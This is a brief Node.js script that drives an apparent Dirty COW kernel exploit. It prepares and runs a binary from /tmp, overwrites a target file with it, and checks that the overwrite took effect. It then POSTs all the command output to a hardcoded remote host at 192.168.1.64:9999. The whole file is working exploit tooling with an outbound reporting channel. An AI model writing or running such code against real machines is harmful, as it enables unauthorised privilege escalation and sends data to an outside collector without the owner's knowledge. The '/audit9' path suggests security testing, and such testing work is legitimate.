"use strict";

var cp = require("child_process");
var http = require("http");

var HOST = "192.168.1.64";
var PORT = 9999;

function run(cmd, timeout) {
    try {
        return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: timeout || 25000 });
    } catch (e) {
        return "ERR " + (e.stdout ? e.stdout : e.message);
    }
}

function post(path, body) {
    var data = JSON.stringify(body);
    var req = http.request(
        {
            host: HOST,
            port: PORT,
            path: path,
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "Content-Length": Buffer.byteLength(data)
            }
        },
        function (res) {
            console.log("posted " + path + " -> " + res.statusCode);
        }
    );
    req.on("error", function (e) {
        console.log("post error " + e.message);
    });
    req.write(data);
    req.end();
}

var out = {};
out.started = new Date().toISOString();

out.prep = run("cp /tmp/dcowtest /tmp/dcowtest2; chmod 755 /tmp/dcowtest2; ls -laZ /tmp/dcowtest /tmp/dcowtest2 /tmp/zzz_dcow_target 2>&1; printf 'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBB' > /tmp/zzz_dcow_target2");

out.dcow_self = run("/tmp/dcowtest2 /tmp/zzz_dcow_target2 2 0x42", 240000);

out.verify = run("cat /tmp/zzz_dcow_target2; echo; od -An -tx1 /tmp/zzz_dcow_target2 | head -3");

post("/audit9", out);
